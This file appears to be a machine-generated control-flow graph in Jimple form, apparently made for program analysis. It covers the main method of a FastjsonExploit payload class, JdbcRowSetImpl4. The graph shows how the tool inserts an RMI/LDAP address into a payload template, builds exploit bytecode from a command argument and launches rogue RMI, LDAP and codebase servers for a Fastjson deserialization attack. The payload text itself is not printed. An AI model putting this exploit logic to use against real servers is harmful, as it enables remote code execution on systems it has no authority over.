digraph "unitGraph" {
    "r25 := @this: payloads.JdbcRowSetImpl4"
    "r0 := @parameter0: java.lang.String[]"
    "$i0 = lengthof r0"
    "if $i0 == 3 goto $r1 = r0[1]"
    "$i4 = lengthof r0"
    "if $i4 == 4 goto $r1 = r0[1]"
    "$r22 = <java.lang.System: java.io.PrintStream out>"
    "virtualinvoke $r22.<java.io.PrintStream: void println(java.lang.String)>(\"[*] Usage: java -jar FastjsonExploit-[version].jar JdbcRowSetImpl4 [rmi/ldap address] [\\\"cmd:xxx|code:xxx.java\\\"]\")"
    "return"
    "$r1 = r0[1]"
    "r2 = virtualinvoke $r1.<java.lang.String: java.lang.String trim()>()"
    "$r3 = r0[2]"
    "r4 = virtualinvoke $r3.<java.lang.String: java.lang.String trim()>()"
    "$z0 = staticinvoke <util.AddressParser: boolean isAddress(java.lang.String)>(r2)"
    "if $z0 != 0 goto $r5 = new util.JarFileReader"
    "staticinvoke <util.Alert: void printValidAddress()>()"
    "$r5 = new util.JarFileReader"
    "specialinvoke $r5.<util.JarFileReader: void <init>()>()"
    "r6 = $r5"
    "r26 = virtualinvoke r6.<util.JarFileReader: java.lang.String read(java.lang.String)>(\"JdbcRowSetImpl4.tpl\")"
    "r27 = virtualinvoke r26.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(\"###RMI_LDAP_ADDRESS###\", r2)"
    "$r7 = <java.lang.System: java.io.PrintStream out>"
    "virtualinvoke $r7.<java.io.PrintStream: void println(java.lang.String)>(\"[*] payload build success!\")"
    "$r8 = <java.lang.System: java.io.PrintStream out>"
    "virtualinvoke $r8.<java.io.PrintStream: void println(java.lang.String)>(\"\")"
    "$r9 = <java.lang.System: java.io.PrintStream out>"
    "virtualinvoke $r9.<java.io.PrintStream: void println(java.lang.String)>(r27)"
    "$r10 = <java.lang.System: java.io.PrintStream out>"
    "virtualinvoke $r10.<java.io.PrintStream: void println(java.lang.String)>(\"\")"
    "$r11 = staticinvoke <gadget.Gadget: byte[] getJdbcRowSetImplExpCode(java.lang.String)>(r4)"
    "<util.Common: byte[] byteCode> = $r11"
    "$r12 = new util.AddressParser"
    "specialinvoke $r12.<util.AddressParser: void <init>()>()"
    "r13 = $r12"
    "virtualinvoke r13.<util.AddressParser: void parser(java.lang.String)>(r2)"
    "r28 = virtualinvoke r13.<util.AddressParser: java.lang.String getHost()>()"
    "$i1 = virtualinvoke r13.<util.AddressParser: int getPort()>()"
    "r14 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i1)"
    "i2 = staticinvoke <util.Util: int getUnusePort(java.lang.String)>(\"127.0.0.1\")"
    "staticinvoke <server.CodebaseServer: void lanuchCodebaseURLServer(java.lang.String,int)>(r28, i2)"
    "$r15 = virtualinvoke r13.<util.AddressParser: java.lang.String getProtocol()>()"
    "$z1 = virtualinvoke $r15.<java.lang.String: boolean equals(java.lang.Object)>(\"rmi\")"
    "if $z1 == 0 goto $r16 = virtualinvoke r13.<util.AddressParser: java.lang.String getProtocol()>()"
    "$r21 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>(i2)"
    "staticinvoke <server.RMIServer: void lanuchRMIregister(java.lang.Integer,java.lang.String,java.lang.Integer)>(r14, r28, $r21)"
    "goto [?= (branch)]"
    "$r16 = virtualinvoke r13.<util.AddressParser: java.lang.String getProtocol()>()"
    "$z2 = virtualinvoke $r16.<java.lang.String: boolean equals(java.lang.Object)>(\"ldap\")"
    "if $z2 == 0 goto (branch)"
    "$r20 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>(i2)"
    "staticinvoke <server.LDAPServer: void lanuchLDAPServer(java.lang.Integer,java.lang.String,java.lang.Integer)>(r14, r28, $r20)"
    "goto [?= $i3 = lengthof r0]"
    "$r23 := @caughtexception"
    "r29 = $r23"
    "virtualinvoke r29.<java.lang.Exception: void printStackTrace()>()"
    "$r24 = <java.lang.System: java.io.PrintStream out>"
    "virtualinvoke $r24.<java.io.PrintStream: void println(java.lang.String)>(\"FastjsonExploit exit!\")"
    "staticinvoke <java.lang.System: void exit(int)>(0)"
    "$i3 = lengthof r0"
    "if $i3 != 4 goto return"
    "$r17 = r0[3]"
    "$z3 = virtualinvoke $r17.<java.lang.String: boolean equals(java.lang.Object)>(\"-exec\")"
    "if $z3 == 0 goto return"
    "$r18 = <java.lang.System: java.io.PrintStream out>"
    "virtualinvoke $r18.<java.io.PrintStream: void println(java.lang.String)>(\"[*] Try local parsing\")"
    "staticinvoke <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>(r27)"
    "r25 := @this: payloads.JdbcRowSetImpl4"->"r0 := @parameter0: java.lang.String[]";
    "r0 := @parameter0: java.lang.String[]"->"$i0 = lengthof r0";
    "$i0 = lengthof r0"->"if $i0 == 3 goto $r1 = r0[1]";
    "if $i0 == 3 goto $r1 = r0[1]"->"$i4 = lengthof r0";
    "if $i0 == 3 goto $r1 = r0[1]"->"$r1 = r0[1]";
    "$i4 = lengthof r0"->"if $i4 == 4 goto $r1 = r0[1]";
    "if $i4 == 4 goto $r1 = r0[1]"->"$r22 = <java.lang.System: java.io.PrintStream out>";
    "if $i4 == 4 goto $r1 = r0[1]"->"$r1 = r0[1]";
    "$r22 = <java.lang.System: java.io.PrintStream out>"->"virtualinvoke $r22.<java.io.PrintStream: void println(java.lang.String)>(\"[*] Usage: java -jar FastjsonExploit-[version].jar JdbcRowSetImpl4 [rmi/ldap address] [\\\"cmd:xxx|code:xxx.java\\\"]\")";
    "virtualinvoke $r22.<java.io.PrintStream: void println(java.lang.String)>(\"[*] Usage: java -jar FastjsonExploit-[version].jar JdbcRowSetImpl4 [rmi/ldap address] [\\\"cmd:xxx|code:xxx.java\\\"]\")"->"return";
    "$r1 = r0[1]"->"r2 = virtualinvoke $r1.<java.lang.String: java.lang.String trim()>()";
    "r2 = virtualinvoke $r1.<java.lang.String: java.lang.String trim()>()"->"$r3 = r0[2]";
    "$r3 = r0[2]"->"r4 = virtualinvoke $r3.<java.lang.String: java.lang.String trim()>()";
    "r4 = virtualinvoke $r3.<java.lang.String: java.lang.String trim()>()"->"$z0 = staticinvoke <util.AddressParser: boolean isAddress(java.lang.String)>(r2)";
    "$z0 = staticinvoke <util.AddressParser: boolean isAddress(java.lang.String)>(r2)"->"if $z0 != 0 goto $r5 = new util.JarFileReader";
    "if $z0 != 0 goto $r5 = new util.JarFileReader"->"staticinvoke <util.Alert: void printValidAddress()>()";
    "if $z0 != 0 goto $r5 = new util.JarFileReader"->"$r5 = new util.JarFileReader";
    "staticinvoke <util.Alert: void printValidAddress()>()"->"return";
    "$r5 = new util.JarFileReader"->"specialinvoke $r5.<util.JarFileReader: void <init>()>()";
    "specialinvoke $r5.<util.JarFileReader: void <init>()>()"->"r6 = $r5";
    "r6 = $r5"->"r26 = virtualinvoke r6.<util.JarFileReader: java.lang.String read(java.lang.String)>(\"JdbcRowSetImpl4.tpl\")";
    "r26 = virtualinvoke r6.<util.JarFileReader: java.lang.String read(java.lang.String)>(\"JdbcRowSetImpl4.tpl\")"->"r27 = virtualinvoke r26.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(\"###RMI_LDAP_ADDRESS###\", r2)";
    "r27 = virtualinvoke r26.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(\"###RMI_LDAP_ADDRESS###\", r2)"->"$r7 = <java.lang.System: java.io.PrintStream out>";
    "$r7 = <java.lang.System: java.io.PrintStream out>"->"virtualinvoke $r7.<java.io.PrintStream: void println(java.lang.String)>(\"[*] payload build success!\")";
    "virtualinvoke $r7.<java.io.PrintStream: void println(java.lang.String)>(\"[*] payload build success!\")"->"$r8 = <java.lang.System: java.io.PrintStream out>";
    "$r8 = <java.lang.System: java.io.PrintStream out>"->"virtualinvoke $r8.<java.io.PrintStream: void println(java.lang.String)>(\"\")";
    "virtualinvoke $r8.<java.io.PrintStream: void println(java.lang.String)>(\"\")"->"$r9 = <java.lang.System: java.io.PrintStream out>";
    "$r9 = <java.lang.System: java.io.PrintStream out>"->"virtualinvoke $r9.<java.io.PrintStream: void println(java.lang.String)>(r27)";
    "virtualinvoke $r9.<java.io.PrintStream: void println(java.lang.String)>(r27)"->"$r10 = <java.lang.System: java.io.PrintStream out>";
    "$r10 = <java.lang.System: java.io.PrintStream out>"->"virtualinvoke $r10.<java.io.PrintStream: void println(java.lang.String)>(\"\")";
    "virtualinvoke $r10.<java.io.PrintStream: void println(java.lang.String)>(\"\")"->"$r11 = staticinvoke <gadget.Gadget: byte[] getJdbcRowSetImplExpCode(java.lang.String)>(r4)";
    "$r11 = staticinvoke <gadget.Gadget: byte[] getJdbcRowSetImplExpCode(java.lang.String)>(r4)"->"<util.Common: byte[] byteCode> = $r11";
    "<util.Common: byte[] byteCode> = $r11"->"$r12 = new util.AddressParser";
    "$r12 = new util.AddressParser"->"specialinvoke $r12.<util.AddressParser: void <init>()>()";
    "specialinvoke $r12.<util.AddressParser: void <init>()>()"->"r13 = $r12";
    "r13 = $r12"->"virtualinvoke r13.<util.AddressParser: void parser(java.lang.String)>(r2)";
    "virtualinvoke r13.<util.AddressParser: void parser(java.lang.String)>(r2)"->"r28 = virtualinvoke r13.<util.AddressParser: java.lang.String getHost()>()";
    "virtualinvoke r13.<util.AddressParser: void parser(java.lang.String)>(r2)"->"$r23 := @caughtexception";
    "r28 = virtualinvoke r13.<util.AddressParser: java.lang.String getHost()>()"->"$i1 = virtualinvoke r13.<util.AddressParser: int getPort()>()";
    "r28 = virtualinvoke r13.<util.AddressParser: java.lang.String getHost()>()"->"$r23 := @caughtexception";
    "$i1 = virtualinvoke r13.<util.AddressParser: int getPort()>()"->"r14 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i1)";
    "$i1 = virtualinvoke r13.<util.AddressParser: int getPort()>()"->"$r23 := @caughtexception";
    "r14 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i1)"->"i2 = staticinvoke <util.Util: int getUnusePort(java.lang.String)>(\"127.0.0.1\")";
    "r14 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i1)"->"$r23 := @caughtexception";
    "i2 = staticinvoke <util.Util: int getUnusePort(java.lang.String)>(\"127.0.0.1\")"->"staticinvoke <server.CodebaseServer: void lanuchCodebaseURLServer(java.lang.String,int)>(r28, i2)";
    "i2 = staticinvoke <util.Util: int getUnusePort(java.lang.String)>(\"127.0.0.1\")"->"$r23 := @caughtexception";
    "staticinvoke <server.CodebaseServer: void lanuchCodebaseURLServer(java.lang.String,int)>(r28, i2)"->"$r15 = virtualinvoke r13.<util.AddressParser: java.lang.String getProtocol()>()";
    "staticinvoke <server.CodebaseServer: void lanuchCodebaseURLServer(java.lang.String,int)>(r28, i2)"->"$r23 := @caughtexception";
    "$r15 = virtualinvoke r13.<util.AddressParser: java.lang.String getProtocol()>()"->"$z1 = virtualinvoke $r15.<java.lang.String: boolean equals(java.lang.Object)>(\"rmi\")";
    "$r15 = virtualinvoke r13.<util.AddressParser: java.lang.String getProtocol()>()"->"$r23 := @caughtexception";
    "$z1 = virtualinvoke $r15.<java.lang.String: boolean equals(java.lang.Object)>(\"rmi\")"->"if $z1 == 0 goto $r16 = virtualinvoke r13.<util.AddressParser: java.lang.String getProtocol()>()";
    "$z1 = virtualinvoke $r15.<java.lang.String: boolean equals(java.lang.Object)>(\"rmi\")"->"$r23 := @caughtexception";
    "if $z1 == 0 goto $r16 = virtualinvoke r13.<util.AddressParser: java.lang.String getProtocol()>()"->"$r21 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>(i2)";
    "if $z1 == 0 goto $r16 = virtualinvoke r13.<util.AddressParser: java.lang.String getProtocol()>()"->"$r16 = virtualinvoke r13.<util.AddressParser: java.lang.String getProtocol()>()";
    "if $z1 == 0 goto $r16 = virtualinvoke r13.<util.AddressParser: java.lang.String getProtocol()>()"->"$r23 := @caughtexception";
    "$r21 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>(i2)"->"staticinvoke <server.RMIServer: void lanuchRMIregister(java.lang.Integer,java.lang.String,java.lang.Integer)>(r14, r28, $r21)";
    "$r21 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>(i2)"->"$r23 := @caughtexception";
    "staticinvoke <server.RMIServer: void lanuchRMIregister(java.lang.Integer,java.lang.String,java.lang.Integer)>(r14, r28, $r21)"->"goto [?= (branch)]";
    "staticinvoke <server.RMIServer: void lanuchRMIregister(java.lang.Integer,java.lang.String,java.lang.Integer)>(r14, r28, $r21)"->"$r23 := @caughtexception";
    "goto [?= (branch)]"->"goto [?= $i3 = lengthof r0]";
    "goto [?= (branch)]"->"$r23 := @caughtexception";
    "$r16 = virtualinvoke r13.<util.AddressParser: java.lang.String getProtocol()>()"->"$z2 = virtualinvoke $r16.<java.lang.String: boolean equals(java.lang.Object)>(\"ldap\")";
    "$r16 = virtualinvoke r13.<util.AddressParser: java.lang.String getProtocol()>()"->"$r23 := @caughtexception";
    "$z2 = virtualinvoke $r16.<java.lang.String: boolean equals(java.lang.Object)>(\"ldap\")"->"if $z2 == 0 goto (branch)";
    "$z2 = virtualinvoke $r16.<java.lang.String: boolean equals(java.lang.Object)>(\"ldap\")"->"$r23 := @caughtexception";
    "if $z2 == 0 goto (branch)"->"$r20 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>(i2)";
    "if $z2 == 0 goto (branch)"->"goto [?= $i3 = lengthof r0]";
    "if $z2 == 0 goto (branch)"->"$r23 := @caughtexception";
    "$r20 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>(i2)"->"staticinvoke <server.LDAPServer: void lanuchLDAPServer(java.lang.Integer,java.lang.String,java.lang.Integer)>(r14, r28, $r20)";
    "$r20 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>(i2)"->"$r23 := @caughtexception";
    "staticinvoke <server.LDAPServer: void lanuchLDAPServer(java.lang.Integer,java.lang.String,java.lang.Integer)>(r14, r28, $r20)"->"goto [?= $i3 = lengthof r0]";
    "staticinvoke <server.LDAPServer: void lanuchLDAPServer(java.lang.Integer,java.lang.String,java.lang.Integer)>(r14, r28, $r20)"->"$r23 := @caughtexception";
    "goto [?= $i3 = lengthof r0]"->"$i3 = lengthof r0";
    "$r23 := @caughtexception"->"r29 = $r23";
    "r29 = $r23"->"virtualinvoke r29.<java.lang.Exception: void printStackTrace()>()";
    "virtualinvoke r29.<java.lang.Exception: void printStackTrace()>()"->"$r24 = <java.lang.System: java.io.PrintStream out>";
    "$r24 = <java.lang.System: java.io.PrintStream out>"->"virtualinvoke $r24.<java.io.PrintStream: void println(java.lang.String)>(\"FastjsonExploit exit!\")";
    "virtualinvoke $r24.<java.io.PrintStream: void println(java.lang.String)>(\"FastjsonExploit exit!\")"->"staticinvoke <java.lang.System: void exit(int)>(0)";
    "staticinvoke <java.lang.System: void exit(int)>(0)"->"$i3 = lengthof r0";
    "$i3 = lengthof r0"->"if $i3 != 4 goto return";
    "if $i3 != 4 goto return"->"$r17 = r0[3]";
    "if $i3 != 4 goto return"->"return";
    "$r17 = r0[3]"->"$z3 = virtualinvoke $r17.<java.lang.String: boolean equals(java.lang.Object)>(\"-exec\")";
    "$z3 = virtualinvoke $r17.<java.lang.String: boolean equals(java.lang.Object)>(\"-exec\")"->"if $z3 == 0 goto return";
    "if $z3 == 0 goto return"->"$r18 = <java.lang.System: java.io.PrintStream out>";
    "if $z3 == 0 goto return"->"return";
    "$r18 = <java.lang.System: java.io.PrintStream out>"->"virtualinvoke $r18.<java.io.PrintStream: void println(java.lang.String)>(\"[*] Try local parsing\")";
    "virtualinvoke $r18.<java.io.PrintStream: void println(java.lang.String)>(\"[*] Try local parsing\")"->"staticinvoke <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>(r27)";
    "staticinvoke <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>(r27)"->"return";
}
